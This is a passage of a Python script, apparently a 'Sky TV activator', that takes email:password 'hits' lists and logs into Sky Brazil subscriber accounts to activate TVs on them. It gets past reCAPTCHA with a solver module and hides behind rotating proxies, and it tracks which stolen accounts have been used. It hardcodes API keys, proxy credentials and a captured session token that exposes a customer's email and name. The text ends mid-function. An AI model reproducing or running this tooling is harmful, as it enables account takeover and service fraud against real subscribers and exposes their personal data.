import os
import sys
import re
import json
import uuid
import time
import base64
import secrets
import threading
import urllib.parse
import html
import cloudscraper
from typing import Optional, List, Tuple
from colorama import Fore, Style, init

# Mesmo solver usado pelo sky.py — ja funciona com reCAPTCHA
from recaptcha_solver import (
    update_payload_session_id,
    get_recaptcha_token,       # Android (payload.b64)    — para emails
    get_recaptcha_web_token,   # Web    (payload_web.b64) — para CPF/telefone
)

# ============================================================
# CONFIGURACAO DE TERMINAL WINDOWS
# ============================================================
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except AttributeError:
        pass
    import ctypes
    try:
        k = ctypes.windll.kernel32
        k.SetConsoleMode(k.GetStdHandle(-11), 7)
        k.SetConsoleCP(65001)
        k.SetConsoleOutputCP(65001)
        k.SetConsoleTitleW("SKY TV ATIVADOR - MASTERON")
    except Exception:
        pass

init(autoreset=True, convert=True)
print_lock = threading.Lock()

# ============================================================
# CONSTANTES — iguais ao sky.py para o login
# ============================================================
AUTH_URL_ANDROID = "https://sm-sky.vrioservices.com/v2/oauth2/authenticate/android"
AUTH_URL_WEB     = "https://sm-sky.vrioservices.com/v2/oauth2/authenticate"
ACTIVATE_URL     = "https://dtv-oidc.tbxapis.com/v2/tv/activation"

WEB_API_KEY    = "jVXvhTOQdcPV6xPZSzdFg8z61t1LTqfc"
MOBILE_API_KEY = "lFjeNnPUWOIBNk7avsKdAB5xLtTRE7Qb"

# Credencial Basic do app skymais (ativacao de TV)
BASIC_AUTH    = "Basic ZHR2Z286TmQza1lhaUVHOA=="
X_APP         = "skymais"
X_CLIENT_VER  = "3.68.0"
X_ENVIRONMENT = "prd"
ORIGIN_SKY    = "https://www.skymais.com.br"
REFERER_SKY   = "https://www.skymais.com.br/"
ORIGIN_SKYUI  = "https://sm-sky-ui.vrioservices.com"
# Tokens capturados de sessao ativa do skymais (fallback e ativacao rapida)
DEFAULT_PROFILE_TOKEN = (
    "eyJhbGciOiJSU0EtT0FFUC0yNTYiLCJlbmMiOiJBMjU2R0NNIn0."
    "MSmD8UZt2XPAXdDRT6rT3P7RRFI6a8PZ783PJC8mJz3FGPd2wTeviBPvu2T2W-pISVqXwr6zxM3szQVLWJDDHIksfwjqyeztF3FXgBcubQHWGVcHwCKpo6sNdd4Sx-pBBYmFXKtGlg9KWWraQV3QEvTktUav40eIKuJdS4F18zHaHtlHAbwpdlWyMDSpXoAlKU-VcZWYr8pSRiymG2u3wyaIrGrzg8Fmw2BnOKDwtypgWbqSBxxjf0ssoRu0u1VqDiUW61m7QisiZhRaLAgbkLTFok2bMGBY1Z6L6ll2clnpgY-sxguHunLeLyFI-dnPy536MQc6yOUkltwjAEvvfQ."
    "zEe1A_2WTkEAret7."
    "ab-0a34sS3cuGkALdhvilfhq9HgvSGvIOWbo6D5Rcwy0L5DxW5GvxTB9XCpJ6z3jY1tAhorCszTUxJU9BaxJYFVAu1XQOTX_WkB6mhrszFAIFq_d7dpstZh0ALXJCVl5gEsDcykfQ6vRCErXHHFvL4ugaG2whj6ySG6MaMIyy7p3lnffYQapavGUHpLygOYBD8EmC1alII6uZyXBiA4l0vo23GFz9nlIDsJrHGLFIoVAXlsOZ1W6S86TyOtFlB3VOijs-yem5OW0GwvPh2v5UaH4w_K5Je7r7c4QzflTjQP-YcfMXInVbYDE0pfTavf9_D2lntPkfkB_PhpPJnTdBQ5diksxqXdRuWKgFnWFQw3cUgNVfZNvdiTcZ1eD_Vu0Yj2_w_-wYANq86T760Ei7Z3KKdR-l7lHwz76qoQkWTYfPrSvs91AFJhM_jX6sU1vGGbMcopTDm3OQkI-f_XTIll1xNCBlXlHWHYkJd8YXdzG6g2bspKMnbuXT1DSINo4VgZbclL2BigqCuCP__6AqS-1CerL8bKqnizGsvdZGegfRC2DzXzGfSH2GcO-gicc-GYlqILO3X7ooXzdl3vyTVQX-Su3qlSeH0tpzsigMC0ioGW-wb2MVOXeRphzdAdNZcVKxfoTj6QJgpntTWi0wGhoZ0oi-kEIn80DZym0xVQiYwxvveXCSksH5mK-Ff19ndEyuLBu9UAjc8CXhs3Win6faLv_WjAVgUKBwLqx0L06LcKbRXzqJ-QJIaZkOtLTSmNOMyRJyZiI1YLOlJVUDhL36IxxZ2y0JWTgsNTmcBJ5E1ROyFRRahpyKUEjYHNwQnXSqJaBzZAH28hrqiyOWoeHS-G9ifLrkEg35OT4GC8bMmrZSPdEsoK2niSbSs3IrooRlZKOIhmvvrOn_MbstSddTgzeAvEAmD_FIZgrkTZl60-COoaBmjfG-PJ2puXOgeWI3i7T8yzpouEBp2M-EDODKfhoSh_mYFnt69NsR_6dnYBWvzPcHOdM7RXJqvPKoaM6hn1kkfLNvebu_RQ7_0IIiJCZTYUaperZap2eioAcwz8ox15GMMzCvS2zzQ."
    "7NXVxV6HZFsmZj5yyun0GQ"
)

DEFAULT_SSO_TOKEN = (
    "eyJhbGciOiJSUzI1NiJ9."
    "eyJ1dWlkIjoiNzZjMzFlOTctY2RmZi00NTAxLTgwYTQtOWI4YjM1OWVhNDdlIiwiYXRfaGFzaCI6IlhYcTZ5ZjhoYTluQ0dnV0otN2pMS0EiLCJhdWRpdFRyYWNraW5nSWQiOiJkYTA4LTQ2ZmEtNDNiNS05OTMwLTdkOWMiLCJ0b2tlbk5hbWUiOiJpZF90b2tlbiIsImF1ZCI6ImR0dmdvIiwiYXpwIjoiZHR2Z28iLCJhdXRoX3RpbWUiOjE3ODkxNjQwNDA1NDAsInRva2VuVHlwZSI6IkpXVFRva2VuIiwidGJ4RGV2aWNlSWQiOiIzNjU3ZGVlYWVlODAzMjBhMDE5OTcyMWE2MzQwNGQ5ZGVkMDMyN2I3IiwibG9nb1VybCI6Imh0dHBzOi8vc3AtbG9nb3MudGJ4bmV0LmNvbS9za3lfYnIucG5nIiwiZW1haWwiOiJyc2dlbmNhZGVybmFjb2VzQHlhaG9vLmNvbS5iciIsImFkZHJlc3MiOiJOVUxMIFBPUlRJTkFSSSIsImN1c3RvbWVyU3RhdHVzIjoiQWN0aXZlIiwiYWNjb3VudElkIjoiMTEyOTAxMTg0IiwiZmFtaWx5TmFtZSI6IlJFTkFUTyIsImlzbzJDb2RlIjoiQlIiLCJnaXZlbk5hbWUiOiJEQSBTSUxWQSIsInVzZXJuYW1lIjoiYWUyODZmNWFhNWUxNDg3NTkxMjQ1ZGQwY2ZkYjA4ZmEiLCJkZXZpY2VJZCI6IjIyNjgxNmVhZDRjM2JlYjdjZmQxNDg5YmRhYmMzMTNiZDljNDNkOTYxNjVhNzRhYzllYzBmMWIzYWNkYWI3NjQiLCJTS1lTaWduYXR1cmUiOiIxMTI5MDExODQiLCJtc29Qcm92aWRlciI6InNreSIsImNoYW5uZWxzIjpbIkNIMDEwMDAwMDAwMDAwNyIsIkNIMDEwMDAwMDAwMDAwOSIsIkNIMDEwMDAwMDAwMDAxMCIsIkNIMDEwMDAwMDAwMDAxNSIsIkNIMDEwMDAwMDAwMDAxOCIsIkNIMDEwMDAwMDAwMDAxOSIsIkNIMDEwMDAwMDAwMDAyMCIsIkNIMDEwMDAwMDAwMDAzMSIsIkNIMDEwMDAwMDAwMDAzMiIsIkNIMDEwMDAwMDAwMDAzMyIsIkNIMDEwMDAwMDAwMDAzNCIsIkNIMDEwMDAwMDAwMDAzNSIsIkNIMDEwMDAwMDAwMDAzNiIsIkNIMDEwMDAwMDAwMDAzOSIsIkNIMDEwMDAwMDAwMDA2MyIsIkNIMDEwMDAwMDAwMDA2NiIsIkNIMDEwMDAwMDAwMDA2NyIsIkNIMDEwMDAwMDAwMDA2OCIsIkNIMDEwMDAwMDAwMDA3MiIsIkNIMDEwMDAwMDAwMDA3OCIsIkNIMDEwMDAwMDAwMDA4NCIsIkNIMDEwMDAwMDAwMDA4OCIsIkNIMDEwMDAwMDAwMDA5MCIsIkNIMDEwMDAwMDAwMDA5MiIsIkNIMDEwMDAwMDAwMDA5MyIsIkNIMDEwMDAwMDAwMDA5NCIsIkNIMDEwMDAwMDAwMDA5NiIsIkNIMDEwMDAwMDAwMDEwNCIsIkNIMDEwMDAwMDAwMDEwNSIsIkNIMDEwMDAwMDAwMDExNCIsIkNIMDEwMDAwMDAwMDExOCIsIkNIMDEwMDAwMDAwMDEyMyIsIkNIMDEwMDAwMDAwMDEyNSIsIkNIMDEwMDAwMDAwMDEyOSIsIkNIMDEwMDAwMDAwMDEzMCIsIkNIMDEwMDAwMDAwMDEzMSIsIkNIMDEwMDAwMDAwMDEzMiIsIkNIMDEwMDAwMDAwMDE0NSIsIkNIMDEwMDAwMDAwMDE2MSIsIkNIMDEwMDAwMDAwMDE3NCIsIkNIMDEwMDAwMDAwMDE5OCIsIkNIMDEwMDAwMDAwMDE5OSIsIkNIMDEwMDAwMDAwMDIwMCIsIkNIMDEwMDAwMDAwMDIwMSIsIkNIMDEwMDAwMDAwMDIwNyIsIkNIMDEwMDAwMDAwMDIxMCIsIkNIMDEwMDAwMDAwMDIxMSIsIkNIMDEwMDAwMDAwMDIxMiIsIkNIMDEwMDAwMDAwMDIxMyIsIkNIMDEwMDAwMDAwMDIxNSIsIkNIMDEwMDAwMDAwMDIxNiIsIkNIMDEwMDAwMDAwMDIxNyIsIkNIMDEwMDAwMDAwMDIyMCIsIkNIMDEwMDAwMDAwMDIyNSIsIkNIMDEwMDAwMDAwMDIzMSIsIkNIMDEwMDAwMDAwMDI4OCIsIkNIMDEwMDAwMDAwMDI4OSIsIkNIMDEwMDAwMDAwMDI5MCIsIkNIMDEwMDAwMDAwMDI5OCIsIkNIMDEwMDAwMDAwMDMwMSIsIkNIMDEwMDAwMDAwMDMwMiIsIkNIMDEwMDAwMDAwMDMwMyIsIkNIMDEwMDAwMDAwMDMwNCIsIkNIMDEwMDAwMDAwMDMwNiIsIkNIMDEwMDAwMDAwMDMwNyIsIkNIMDEwMDAwMDAwMDMwOCIsIkNIMDEwMDAwMDAwMDMwOSIsIkNIMDEwMDAwMDAwMDMxNyIsIkNIMDIwMDAwMDAwMDAwNSJdLCJjc20iOiIzIiwicmVnaW9ucyI6WyI0ZmFkMzEzYi0xNTA1LTUyZjAtOWMyNS01MDQxYzYzN2NkOTAiLCI1Y2I0MWNlMC03YWMwLTExZWMtODAxMC1jMzQxZTBmN2U0ZDgiLCJjZjE1OTA0Zi1mZGJkLTU5ZjYtYWM1MC1kNDdlYTZjYjhhYmYiLCJiMzQ5ZTFhNy1iMjQ3LTVmYWItYjAyYi04NWY5NDNlY2FmOGIiLCJhYTFkYTQ0ZS1iYzhlLTQ0MDEtOTA3Mi1jODE5OTA3OGQwN2EiXSwiQ0IxIjpmYWxzZSwidnJpb0RldmljZUlkIjoiMTZmYjUyODAtYzM4ZS00ZGY5LTg0YTUtOWI1YzkxNDdmZGY5IiwibmFtZSI6IkRBIFNJTFZBIFJFTkFUTyIsImN1c3RvbWVySWQiOiIxMTI5MDExODQiLCJyZWFsbSI6Ii9iciIsImJ1aWxkIjoiVlJJTy0xLUJSQSIsInNlcnZpY2VQcm92aWRlckFjY291bnRJZCI6InNreV9yc2dlbmNhZGVybmFjb2VzQHlhaG9vLmNvbS5iciIsIm1pYXQiOiIxNzg5MTY0MDQwNDEwIiwiY3ZrIjoiNzhhZWQwMjNiMDFmNWE3ZjE1NDMyZTBiODY0ODBmN2VlMjdhMmE1MjIyYWU0YTU1NDI5ZWZmODkwZTM0ODQ0YyIsInZyaW9DdXN0b21lcklkIjoiZDExNzkxODItODk4OC01ODdkLWIzODgtNWYyODEzYmQ0ZmVhIiwic3ViIjoic2t5X3JzZ2VuY2FkZXJuYWNvZXNAeWFob28uY29tLmJyIiwiYnVzaW5lc3NVbml0IjoiU0tZLURUSCIsInJlZGVtcHRpb25MaW1pdCI6bnVsbCwiaWF0IjoxNzg5MTY0MDQwLCJleHAiOjE3ODkzMzY4NDAsImlzcyI6InNtLWRnby52cmlvc2VydmljZXMuY29tIn0."
    "IAHXKUqoUbl1j5yn86w6QDK_Iiz4bdEPo-RkvvFCJjwUroIp1PDENIQG549q9pJ25sSNTr6QOPxk07OSoqwG6cocd3aTH9Cv0ow57olzP2VYPaoQMcpVhh_PvHV3VFaST6o7y1U-PJs6QT_Y6JRDvCAF2Vv8ad2rvbR5-0uBH6mF2RV0VSSkaBgW45UQgOixg8vRHK96Z42RmmYU7Ovp2wljksQOMfiMRcRD5VCjEWhRUmrxf0HYTuc5GXO3wii3nv1IL8UW_jFxrVQsxqjf0oL-8Uy733EpCx6giG2nQSq_kbd6WAvw0RP2g5ZpE3KxmJVlxSkYfv37P8hnqJDFNw"
)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SSO_TOKEN_FILE = os.path.join(BASE_DIR, "sso_token.txt")
PROFILE_TOKEN_FILE = os.path.join(BASE_DIR, "profile_token.txt")

def reload_tokens():
    global DEFAULT_SSO_TOKEN, DEFAULT_PROFILE_TOKEN
    if os.path.exists(SSO_TOKEN_FILE):
        try:
            with open(SSO_TOKEN_FILE, "r", encoding="utf-8") as f:
                _s = f.read().strip()
                if _s:
                    DEFAULT_SSO_TOKEN = _s
        except Exception:
            pass

    if os.path.exists(PROFILE_TOKEN_FILE):
        try:
            with open(PROFILE_TOKEN_FILE, "r", encoding="utf-8") as f:
                _p = f.read().strip()
                if _p:
                    DEFAULT_PROFILE_TOKEN = _p
        except Exception:
            pass
    return DEFAULT_SSO_TOKEN, DEFAULT_PROFILE_TOKEN

reload_tokens()

DEFAULT_DEVICE_ID = "226816ead4c3beb7cfd1489bdabc313bd9c43d96165a74ac9ec0f1b3acdab764"

REFERER_SKYUI = "https://sm-sky-ui.vrioservices.com/"

# OAuth params do fluxo skymais.com.br (para obter ssoToken via TBX)
OAUTH_AUTHORIZE_URL = "https://sm-sky.vrioservices.com/v2/oauth2/authorize"
OAUTH_REDIRECT      = "https://sp.tbxnet.com/v2/auth/oauth2/assert"
OAUTH_FAIL_REDIR    = "https://www.skymais.com.br/ativar"
OAUTH_PARAMS = {
    "client_id":       "sky_br",
    "country":         "BR",
    "cp_convert":      "dtvgo",
    "failureRedirect": "https://www.skymais.com.br/ativar",
    "redirect_uri":    "https://sp.tbxnet.com/v2/auth/oauth2/assert",
    "response_type":   "code",
}

USER_AGENT_WEB = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)

# ============================================================
# PROXY DATAIMPULSE (igual ao sky.py)
# ============================================================
PROXY_USER = os.environ.get("PROXY_USER", "1a1a873f76905f764786")
PROXY_PASS = os.environ.get("PROXY_PASS", "01e103487dc83ae7")
PROXY_HOST = os.environ.get("PROXY_HOST", "gw.dataimpulse.com")
PROXY_PORT = os.environ.get("PROXY_PORT", "823")

def _new_proxy_url() -> str:
    sid = uuid.uuid4().hex[:8]
    return f"http://{PROXY_USER}__sessid.{sid}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"

def _generate_device_id() -> str:
    import base64
    raw = secrets.token_bytes(32)
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()[:43]

# ============================================================
# LEITURA DOS HITS (igual ao anterior)
# ============================================================
def _parse_hit_block(block: str) -> Optional[Tuple[str, str]]:
    match = re.search(r"Login:\s*([^\s:]+):(.+)", block)
    if match:
        return match.group(1).strip(), match.group(2).strip()
    return None

def load_hits_from_file(filepath: str) -> List[Tuple[str, str]]:
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
    except FileNotFoundError:
        return []
    accounts, seen = [], set()
    for block in re.split(r"\u2554", content):
        parsed = _parse_hit_block(block)
        if parsed:
            key = f"{parsed[0]}:{parsed[1]}"
            if key not in seen:
                seen.add(key)
                accounts.append(parsed)
    return accounts

def load_simple_file(filepath: str) -> List[Tuple[str, str]]:
    accounts, seen = [], set()
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if ":" in line:
                    parts = line.split(":", 1)
                    email, password = parts[0].strip(), parts[1].strip()
                    if email and password:
                        key = f"{email}:{password}"
                        if key not in seen:
                            seen.add(key)
                            accounts.append((email, password))
    except FileNotFoundError:
        pass
    return accounts

ACTIVATED_ACCOUNTS_FILE = os.path.join("hits", "contas_ativadas.txt")

def get_activation_counts() -> dict:
    """Retorna dict {email_lower: quantidade_de_ativacoes}."""
    counts = {}
    if os.path.exists(ACTIVATED_ACCOUNTS_FILE):
        try:
            with open(ACTIVATED_ACCOUNTS_FILE, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if ":" in line and "|" in line:
                        acc = line.split("|")[0].strip()
                        em = acc.split(":")[0].strip().lower()
                        counts[em] = counts.get(em, 0) + 1
        except Exception:
            pass
    return counts

def record_account_activated(email: str, password: str, tv_code: str):
    """Registra conta utilizada para ativar uma TV."""
    os.makedirs("hits", exist_ok=True)
    import datetime
    now_str = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    line = f"{email}:{password} | TV: {tv_code} | {now_str}\n"
    try:
        with open(ACTIVATED_ACCOUNTS_FILE, "a", encoding="utf-8", errors="replace") as f:
            f.write(line)
    except Exception:
        pass

def load_hits_from_hits_folder() -> List[Tuple[str, str]]:
    priority_files = ["COMPLETAS.txt", "MEDIA.txt", "BASICA.txt", "Todos_Hits.txt"]
    all_accounts, seen = [], set()
    for fname in priority_files:
        fpath = os.path.join("hits", fname)
        if os.path.exists(fpath):
            for acc in load_hits_from_file(fpath):
                key = f"{acc[0]}:{acc[1]}"
                if key not in seen:
                    seen.add(key)
                    all_accounts.append(acc)
    # Também inclui contas da pasta raw_json caso existam
    raw_dir = os.path.join("hits", "raw_json")
    if os.path.exists(raw_dir):
        for fname in os.listdir(raw_dir):
            if fname.endswith(".json"):
                fpath = os.path.join(raw_dir, fname)
                try:
                    with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                        d = json.load(f)
                        em = d.get("email", "")
                        pw = d.get("password", "")
                        if em and pw:
                            key = f"{em}:{pw}"
                            if key not in seen:
                                seen.add(key)
                                all_accounts.append((em, pw))
                except Exception:
                    pass

    # Ordena para priorizar contas NUNCA USADAS ou com menor número de ativações
    act_counts = get_activation_counts()
    all_accounts.sort(key=lambda acc: act_counts.get(acc[0].strip().lower(), 0))
    unused_count = sum(1 for acc in all_accounts if act_counts.get(acc[0].strip().lower(), 0) == 0)
    print(f"{Fore.GREEN}[+] {len(all_accounts)} contas carregadas ({unused_count} nunca usadas para TV){Style.RESET_ALL}")
    return all_accounts

def get_cached_hit_data(email: str) -> Optional[dict]:
    """Recupera dados já cacheados (como jwt_token, signatures, cpf) de hits/raw_json/."""
    raw_dir = os.path.join("hits", "raw_json")
    if not os.path.exists(raw_dir):
        return None
    clean = re.sub(r"\D", "", email)
    direct_checks = [
        os.path.join(raw_dir, f"{email}.json"),
        os.path.join(raw_dir, f"{clean}.json") if clean else "",
    ]
    for p in direct_checks:
        if p and os.path.exists(p):
            try:
                with open(p, "r", encoding="utf-8", errors="ignore") as f:
                    return json.load(f)
            except Exception:
                pass
    # Varre arquivos json procurando por email
    try:
        for fname in os.listdir(raw_dir):
            if fname.endswith(".json"):
                fpath = os.path.join(raw_dir, fname)
                try:
                    with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                        data = json.load(f)
                        if data.get("email") == email:
                            return data
                        if clean and re.sub(r"\D", "", data.get("email", "")) == clean:
                            return data
                except Exception:
                    pass
    except Exception:
        pass
    return None

# ============================================================
# CLASSE PRINCIPAL — usa o mesmo login do sky.py que ja funciona
# ============================================================
class SkyTVActivator:
    """
    Login: usa o mesmo fluxo do sky.py (que ja passa pelo reCAPTCHA):
      - Email  -> Android endpoint + get_recaptcha_token (payload.b64)
      - CPF/Tel -> Web endpoint   + get_recaptcha_web_token (payload_web.b64)

    Ativacao: POST dtv-oidc.tbxapis.com/v2/tv/activation
      - Tenta com accessToken no header 'ssotoken'
      - Tenta com 'Authorization: Bearer <token>'
    """

    def __init__(self, use_proxy: bool = True):
        self.use_proxy = use_proxy
        self.proxy_url: Optional[str] = None
        self.session: Optional[cloudscraper.CloudScraper] = None
        self._new_session()

    def _new_session(self, force_direct: bool = False):
        if self.session:
            try:
                self.session.close()
            except Exception:
                pass
        # Mesma configuracao do sky.py
        self.session = cloudscraper.create_scraper(
            browser={"browser": "chrome", "platform": "android", "desktop": False},
            delay=1,
        )
        if self.use_proxy and not force_direct:
            self.proxy_url = _new_proxy_url()
            self.session.proxies.update({
                "http":  self.proxy_url,
                "https": self.proxy_url,
            })
        else:
            self.proxy_url = None

    # ----------------------------------------------------------
    # TROCA refreshToken por ssoToken JWT (via sm-sky /v2/oauth2/token)
    # ----------------------------------------------------------
    def _exchange_token_for_sso(self, refresh_token: str) -> Optional[str]:
        """
        Troca o refreshToken por idToken JWT — o mesmo que sky.py usa como jwt_token.
        Este JWT pode ser o ssoToken aceito pela ativacao de TV.
        """
        if not refresh_token:
            return None
        headers = {
            "host":               "sm-sky.vrioservices.com",
            "x-environment":      "prd",
            "x-user-id":          "SiteSKY",
            "x-api-key":          WEB_API_KEY,
            "x-consumer-system":  "SiteSKY",
            "x-client-type":      "web",
            "content-type":       "application/json",
            "origin":             "https://www.sky.com.br",
            "referer":            "https://www.sky.com.br/",
            "user-agent":         USER_AGENT_WEB,
        }
        body = {
            "grantType":    "refresh_token",
            "refreshToken": refresh_token,
            "clientId":     "sky_br",
        }
        for url in [
            "https://sm-sky.vrioservices.com/v2/oauth2/token",
            "https://sm-sky.vrioservices.com/oauth2/token",
        ]:
            try:
                resp = self.session.post(url, headers=headers, json=body, timeout=15)
                if resp.status_code == 200:
                    data = resp.json()
                    tok = data.get("idToken") or data.get("id_token") or data.get("accessToken")
                    if tok and "ey" in str(tok):
                        return tok
            except Exception:
                pass
        return None

    # ----------------------------------------------------------
    # GET WEB ACCESS TOKEN (login via Web, igual ao sky.py)
    # ----------------------------------------------------------
    def get_web_access_token(self, email: str, password: str,
                             payload_web: str,
                             cpf: Optional[str] = None) -> Optional[str]:
        """Faz login pela rota Web para obter um accessToken Web (necessario para fetch_id_token e OAuth)."""
        try:
            recaptcha_token = get_recaptcha_web_token(payload_web, proxy=self.proxy_url)
            web_headers = {
                "host":               "sm-sky.vrioservices.com",
                "x-environment":      "prd",
                "x-user-id":          "SiteSKY",
                "x-api-key":          WEB_API_KEY,
                "x-consumer-system":  "SiteSKY",
                "x-client-type":      "web",
                "content-type":       "application/json",
                "origin":             "https://www.sky.com.br",
                "referer":            "https://www.sky.com.br/",
                "user-agent":         USER_AGENT_WEB,
            }

            if "@" in email:
                auth_payload = {
                    "grantType":            "password",
                    "email":                email,
                    "password":             password,
                    "g-recaptcha-response": recaptcha_token,
                }
            else:
                clean_num = re.sub(r"\D", "", email)
                if len(clean_num) <= 11:
                    clean_num = clean_num.zfill(11)
                auth_payload = {
                    "grantType":            "password",
                    "telephoneNumber":      clean_num,
                    "password":             password,
                    "g-recaptcha-response": recaptcha_token,
                }

            resp = self.session.post(
                AUTH_URL_WEB, headers=web_headers, json=auth_payload, timeout=25
            )
            if resp.status_code == 200:
                tok = resp.json().get("accessToken")
                if tok:
                    return tok
            else:
                with print_lock:
                    print(f"{Fore.YELLOW}  [Web Login] HTTP {resp.status_code}: {resp.text[:100]}{Style.RESET_ALL}")
        except Exception as e:
            with print_lock:
                print(f"{Fore.YELLOW}  [Web Login] Erro: {e}{Style.RESET_ALL}")
        return None

    # ----------------------------------------------------------
    # FETCH ID TOKEN via authorizationSignature (IGUAL AO sky.py)
    # Este e o unico metodo que retorna um JWT real para ativacao de TV
    # ----------------------------------------------------------
    def fetch_id_token(self, signature_id: str, web_access_token: str,
                       payload_web: str) -> Optional[str]:
        """Troca o web_access_token + signatureId pelo id_token JWT oficial."""
        endpoints = [
            ("sm-sky", "https://sm-sky.vrioservices.com/v2/oauth2/token", "https://www.sky.com.br"),
            ("sm-sky-ui", "https://sm-sky-ui.vrioservices.com/v2/oauth2/token", "https://www.skymais.com.br"),
        ]
        for ep_name, token_url, origin_url in endpoints:
            token_headers = {
                "host":               token_url.split("//")[1].split("/")[0],
                "x-environment":      "prd",
                "x-user-id":          "SiteSKY",
                "x-api-key":          WEB_API_KEY,
                "x-consumer-system":  "SiteSKY",
                "x-client-type":      "web",
                "content-type":       "application/json",
                "origin":             origin_url,
                "referer":            f"{origin_url}/",
                "user-agent":         USER_AGENT_WEB,
            }
            try:
                rcap = get_recaptcha_web_token(payload_web, proxy=self.proxy_url)
                # Payload oficial testado (sem clientId, que causa HTTP 400)
                token_body = {
                    "grantType":            "authorizationSignature",
                    "signature":            str(signature_id),
                    "accessToken":          web_access_token,
                    "g-recaptcha-response": rcap,
                }
                resp = self.session.post(token_url, headers=token_headers, json=token_body, timeout=15)
                if resp.status_code == 200:
                    data = resp.json()
                    tok = data.get("id_token") or data.get("accessToken")
                    if tok:
                        with print_lock:
                            print(f"{Fore.GREEN}  [✓] id_token obtido com sucesso em {ep_name}! ({tok[:25]}...){Style.RESET_ALL}")
                        return tok
                else:
                    with print_lock:
                        print(f"  [fetch_id_token {ep_name}] HTTP {resp.status_code}: {resp.text[:100]}")
            except Exception as e:
                with print_lock:
                    print(f"  [fetch_id_token {ep_name}] Erro: {e}")
        return None

    # ----------------------------------------------------------
    # OAUTH / TBX SSO TOKEN — obtém ssoToken real do TBX (sp.tbxnet.com)
    # ----------------------------------------------------------
    def _fetch_sso_token_tbx(self, email: str, password: str,
                             payload_web: Optional[str] = None,
                             web_access_token: Optional[str] = None,
                             jwt_token: Optional[str] = None,
                             signature_id: Optional[str] = None) -> Optional[str]:
        """
        Obtém o ssoToken do TBX (Toolbox/DirecTV GO) necessário para dtv-oidc.tbxapis.com.
        Executa múltiplos caminhos:
          1. GET no OAuth authorize com headers VRIO completos, cookies e parâmetros de token
          2. Direct Assertion ao TBX (sp.tbxnet.com/v2/auth/oauth2/assert) via POST e GET
          3. TBX Token Exchange (dtv-oidc.tbxapis.com / sp.tbxnet.com)
          4. OAuth authorize com reCAPTCHA
        """
        # Configura política de cookies permissiva para aceitar cookies cross-domain (TBX / skymais)
        import http.cookiejar
        class PermissiveCookiePolicy(http.cookiejar.DefaultCookiePolicy):
            def set_ok(self, cookie, request):
                return True
            def return_ok(self, cookie, request):
                return True

        try:
            self.session.cookies.set_policy(PermissiveCookiePolicy())
        except Exception:
            pass

        def _is_vrio_jwt(s: str) -> bool:
            """Retorna True se for JWT emitido pela VRIO (sm-sky), que o TBX rejeita diretamente."""
            if not s or not s.startswith("ey") or "." not in s:
                return False
            try:
                parts = s.split(".")
                if len(parts) >= 2:
                    p = parts[1]
                    rem = len(p) % 4
                    if rem:
                        p += "=" * (4 - rem)
                    decoded = json.loads(base64.urlsafe_b64decode(p))
                    iss = str(decoded.get("iss", "")).lower()
                    if "vrioservices.com" in iss:
                        return True
            except Exception:
                pass
            return False

        def _clean_token(s: str) -> Optional[str]:
            if not s:
                return None
            s = urllib.parse.unquote(str(s)).strip('\"\' \r\n\t')
            if s.startswith("Bearer ") or s.startswith("bearer "):
                s = s[7:].strip()
            if _is_vrio_jwt(s):
                return None
            if web_access_token and s.lower() == web_access_token.lower():
                return None
            if s.startswith("ey") and len(s) > 30:
                return s
            if len(s) >= 12 and re.match(r'^[a-zA-Z0-9_\-\.\:\=\%\+\/]+$', s):
                return s
            return None

        def _extract_from_response(resp=None, url: str = "") -> Optional[str]:
            # 1. Cookies da sessão e das respostas (excluindo vrioservices)
            all_cookies = list(self.session.cookies)
            if resp:
                if hasattr(resp, "cookies"):
                    all_cookies.extend(list(resp.cookies))
                if hasattr(resp, "history"):
                    for r in resp.history:
                        if hasattr(r, "cookies"):
                            all_cookies.extend(list(r.cookies))
            for ck in all_cookies:
                cdomain = (ck.domain or "").lower()
                if "vrio" in cdomain:
                    continue
                cname = ck.name.lower()
                cval = (ck.value or "").strip('\"\'')
                if any(k == cname or k in cname for k in ["ssotoken", "sso_token", "tbxsso", "tbx_token", "dtv_token"]):
                    tok = _clean_token(cval)
                    if tok:
                        return tok

            # 2. Raw Set-Cookie headers (imune a filtros de domínio do CookieJar)
            raw_cookies = []
            if resp:
                if hasattr(resp, "headers"):
                    sc = resp.headers.get("set-cookie", "")
                    if sc:
                        raw_cookies.append(sc)
                if hasattr(resp, "raw") and hasattr(resp.raw, "headers") and hasattr(resp.raw.headers, "getlist"):
                    try:
                        raw_cookies.extend(resp.raw.headers.getlist("Set-Cookie"))
                    except Exception:
                        pass
                if hasattr(resp, "history"):
                    for r in resp.history:
                        if hasattr(r, "headers"):
                            sc = r.headers.get("set-cookie", "")
                            if sc:
                                raw_cookies.append(sc)

            for sc_hdr in raw_cookies:
                for m in re.finditer(r'([a-zA-Z0-9_\-]+)=([^;,\s]+)', sc_hdr):
                    k, v = m.group(1).lower(), m.group(2)
                    if any(w in k for w in ["ssotoken", "sso_token", "tbxsso", "tbx_token", "dtv_token"]):
                        tok = _clean_token(v)
                        if tok:
                            return tok

            # 3. Headers diretos (Authorization, ssoToken, etc.)
            if resp and hasattr(resp, "headers"):
                for h_k, h_v in resp.headers.items():
                    if any(w in h_k.lower() for w in ["ssotoken", "sso_token", "x-sso-token", "x-auth-token"]):
                        tok = _clean_token(h_v)
                        if tok:
                            return tok

            # 4. URLs / Locations
            urls_to_check = [url]
            if resp:
                if hasattr(resp, "url"):
                    urls_to_check.append(resp.url)
                loc = resp.headers.get("Location") or resp.headers.get("location", "")
                if loc:
                    urls_to_check.append(loc)
                if hasattr(resp, "history"):
                    for r in resp.history:
                        if hasattr(r, "url"):
                            urls_to_check.append(r.url)
                        hloc = r.headers.get("Location") or r.headers.get("location", "")
                        if hloc:
